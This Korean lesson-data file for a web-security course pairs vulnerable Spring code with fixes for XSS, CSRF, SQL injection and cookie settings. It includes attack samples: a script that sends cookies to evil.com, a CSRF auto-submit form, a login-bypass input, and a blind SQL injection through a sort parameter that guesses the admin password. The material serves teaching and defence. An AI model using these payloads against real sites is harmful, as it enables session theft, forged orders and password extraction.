# 웹 보안 기초
# 자료 파일의 칸은 docs/lesson-data-format.md에 있다. 문제는 content/questions/web-security-basics.yaml에 있다.
title: 웹 보안 기초
description: XSS, CSRF, SQL 인젝션이 어떻게 일어나고 어떻게 막는지, 로그인 쿠키와 토큰을 어떻게 지키는지. 네 가지 질문에 스스로 답할 수 있게 만드는 대화형 레슨.
unit: 네트워크와 웹
minutes: 22
roadmap: N10
type: 개념 설명
prerequisites:
  - {slug: cookie-session-token, title: 쿠키, 세션, 토큰}
  - {slug: cors, title: CORS}
assume: '쿠키가 요청마다 자동으로 가고 세션 ID가 쿠키에 있다는 것(쿠키, 세션, 토큰 레슨), 다른 출처의 단순 POST는 서버에서 처리된다는 것(CORS 레슨), SQL의 SELECT와 WHERE. 스프링 부트 3.5, PostgreSQL 16. 브라우저가 스크립트를 실행하는 모습은 테스트로 돌릴 수 없어서, 서버가 돌려준 HTML과 헤더를 테스트로 확인하고 브라우저의 동작은 명세와 문서를 근거로 적어요.'
example: '쇼핑몰의 상품 후기 게시판, 주문 API, 로그인. 질문 1은 후기에 스크립트를 넣는 공격, 질문 2는 다른 사이트에서 주문을 보내는 공격, 질문 3은 로그인 쿼리에 SQL을 넣는 공격, 질문 4는 로그인 토큰을 어디에 둘지예요.'
intro:
  - '보안 사고는 대개 어려운 해킹이 아니라 기본을 빠뜨린 곳에서 나요. 후기 하나를 열었을 뿐인데 다른 사용자의 세션이 털리고, 다른 사이트를 구경했을 뿐인데 주문이 생기고, 로그인 칸에 따옴표 하나를 넣었더니 관리자로 들어가져요.'
  - '스프링 개발자는 이 셋을 매일 막고 있어요. 템플릿 엔진이 글자를 바꿔 쓰는 것, 스프링 시큐리티의 CSRF 토큰, JPA와 `JdbcTemplate`의 `?` 자리가 모두 이 공격들 때문에 있어요. 그 이유를 모르면 "불편해서" 끄는 순간 구멍이 생겨요. 면접에서는 "XSS와 CSRF의 차이", "SQL 인젝션을 어떻게 막나요"를 자주 물어요.'
  - '이 레슨에서는 스프링 서버와 PostgreSQL에 실제로 공격 입력을 보내 무엇이 뚫리는지 보고, 막는 코드로 바꿨을 때 응답과 쿼리 결과가 어떻게 달라지는지 확인해요.'
covers:
  - {topic: 'XSS: 사용자가 넣은 글이 다른 사용자의 브라우저에서 스크립트로 실행된다. 그 사이트의 출처로 실행되어 쿠키와 화면을 다룬다', where: 질문 1}
  - {topic: 'XSS의 종류: 저장형(게시글), 반사형(주소의 값을 그대로 보여 줌)', where: 질문 1}
  - {topic: 'XSS 막기: 출력할 때 HTML 특수 문자를 바꿔 쓴다(이스케이프). 템플릿 엔진은 기본으로 한다', where: 질문 1}
  - {topic: 'Content-Security-Policy로 실행할 스크립트를 제한한다', where: 질문 1의 더 알아보기}
  - {topic: 'CSRF: 다른 사이트가 사용자의 브라우저로 우리 서버에 요청을 보내게 한다. 쿠키가 자동으로 실려 서버는 사용자의 요청으로 안다', where: 질문 2}
  - {topic: 'CORS는 CSRF를 막지 않는다', where: '질문 2. 이유는 CORS(N9)'}
  - {topic: 'CSRF 막기: CSRF 토큰, SameSite 쿠키, Origin 확인. 상태를 바꾸는 일을 GET으로 하지 않는다', where: 질문 2}
  - {topic: 'SQL 인젝션: 입력을 SQL 문자열에 이어 붙이면 입력이 SQL의 구조를 바꾼다', where: 질문 3}
  - {topic: 'SQL 인젝션 막기: PreparedStatement의 바인딩(?), JPA의 파라미터', where: 질문 3}
  - {topic: '바인딩할 수 없는 자리(정렬 칸 이름, 테이블 이름)는 허락한 값의 목록으로 고른다', where: 실무에서는}
  - {topic: 'SQL을 문자열로 이어 붙이는 SQL 인젝션 (자바 String 레슨에서 넘어온 것)', where: 질문 3}
  - {topic: '쿠키의 보안 속성: HttpOnly(자바스크립트가 못 읽음), Secure(HTTPS로만), SameSite(다른 사이트의 요청에 싣는지)', where: 질문 4}
  - {topic: '로그인 토큰을 localStorage에 둘지 HttpOnly 쿠키에 둘지: XSS와 CSRF의 맞바꿈', where: 질문 4}
  - {topic: 'HSTS: 브라우저가 이 사이트에는 HTTPS로만 가게 한다', where: 질문 4의 더 알아보기}
  - {topic: '스프링 시큐리티의 기본 보호: CSRF 토큰, 보안 헤더(X-Content-Type-Options, X-Frame-Options, HSTS)', where: 실무에서는}
  - {topic: '타임리프의 th:text와 th:utext', where: 실무에서는}
  - {topic: '흔한 실수: 정렬 칸을 요청 값으로 이어 붙인다', where: 실무에서는}
  - {topic: '비밀번호를 저장하는 법(해시, BCrypt)', where: '다루지 않음: 인증과 인가(S12)'}
  - {topic: '세션 고정 공격', where: '다루지 않음: 인증과 인가(S12)'}
  - {topic: '요청 수 제한과 무차별 대입 막기', where: '다루지 않음: 처리율 제한(A 과정)'}
codes:
  review: |-
    @GetMapping(value = "/reviews/{id}",
        produces = "text/html")
    String show(@PathVariable long id) {
      Review r = reviews.find(id);
      return "<p>" + [[r.content()]] + "</p>";
    }
  attack: |-
    맛있어요<script>
    fetch("https://evil.com/?c="
      + document.cookie)
    </script>
  escaped: |-
    return "<p>"
        + [[HtmlUtils.htmlEscape]](
            r.content())
        + "</p>";
  csrfForm: |-
    <!-- https://evil.com 의 페이지 -->
    <form method="POST"
      action="https://shop.com/orders">
      <input name="productId" value="7">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  csrfRun: |-
    # evil.com의 폼이 보낸 것과 같은 요청
    POST /orders HTTP/1.1
    Origin: https://evil.com
    Cookie: SESSION=kim-session
    Content-Type:
      application/x-www-form-urlencoded

    productId=7
  originCheck: |-
    String origin = req.getHeader("Origin");
    boolean ours =
        "https://shop.com".equals(origin);
    if (!"GET".equals(req.getMethod())
        && origin != null && [[!ours]]) {
      res.sendError(403);
      return false;
    }
  login: |-
    String sql =
        "SELECT * FROM member "
        + "WHERE email = '" + [[email]] + "' "
        + "AND password = '" + [[pw]] + "'";
  injection: |-
    email: admin@shop.com' --
    pw:    아무거나
  injectedSql: |-
    SELECT * FROM member
    WHERE email = 'admin@shop.com' ⤶
    [[--' AND password = '아무거나']]
  loginSafe: |-
    String sql = "SELECT * FROM member "
        + "WHERE email = [[?]] "
        + "AND password = [[?]]";
    PreparedStatement ps =
        conn.prepareStatement(sql);
    ps.setString(1, email);
    ps.setString(2, pw);
  jpql: |-
    // 이렇게 하지 않는다
    em.createQuery(
        "select m from Member m "
        + "where m.email = '" + email + "'");

    // 파라미터로 넣는다
    em.createQuery(
        "select m from Member m "
        + "where m.email = [[:email]]")
      .setParameter("email", email);
  cookie: |-
    ResponseCookie c = ResponseCookie
        .from("SESSION", id)
        .[[httpOnly(true)]]
        .[[secure(true)]]
        .[[sameSite("Lax")]]
        .path("/")
        .maxAge(Duration.ofMinutes(30))
        .build();
  thymeleaf: |-
    <!-- 바꿔 쓴다 -->
    <p [[th:text]]="${review.content}"></p>

    <!-- 그대로 쓴다. 사용자 글에 쓰지 않는다 -->
    <p [[th:utext]]="${review.content}"></p>
  sortMistake: |-
    @GetMapping("/products")
    List<String> list(
        @RequestParam String sort) {
      return jdbc.queryForList(
          "SELECT name FROM product "
          + "ORDER BY " + [[sort]],
          String.class);
    }
  sortAttack: |-
    # admin 비밀번호의 첫 글자를 맞혀 본다
    sort=price
    sort=(CASE WHEN (SELECT password
      FROM member WHERE id = 1)
      LIKE 'a%' THEN price ELSE -price END)
    sort=(... LIKE 'b%' ...)
  sortFixed: |-
    private static final Set<String>
        SORTABLE = Set.of("price", "name");

    if (![[SORTABLE.contains(sort)]]) {
      throw new IllegalArgumentException();
    }
